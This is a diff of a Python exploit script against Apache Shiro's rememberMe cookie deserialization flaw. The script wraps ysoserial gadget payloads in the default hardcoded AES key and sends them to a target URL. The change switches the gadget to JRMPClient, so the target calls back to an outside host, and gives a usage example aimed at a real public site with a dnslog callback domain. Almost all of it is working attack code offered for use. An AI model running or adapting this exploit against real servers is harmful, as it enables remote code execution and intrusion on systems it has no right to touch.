@@ -10,7 +10,7 @@ from Crypto.Cipher import AES
 
 #get a rememberme payload
 def encode_rememberme(command):
-    popen = subprocess.Popen(['java', '-jar', '../module/ysoserial.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE)
+    popen = subprocess.Popen(['java', '-jar', '../module/ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
     BS = AES.block_size
     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
     key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
@@ -38,7 +38,7 @@ def exp_shiro(url,cmd):
 if __name__=='__main__':
     if len(sys.argv)!=3:
         print("Usage:"+"python3 shiro.py  url  \"command\"")
-        print("Example:"+"python3 shiro_crack.py http://www.baidu.com/login.do \"ping zzz1695jb.dnslog.cn\"")
+        print("Example:"+"python3 shiro_jrmp.py http://www.baidu.com/login.do \"zzz1695jb.dnslog.cn\"")
     else:
         try:
             url = sys.argv[1]
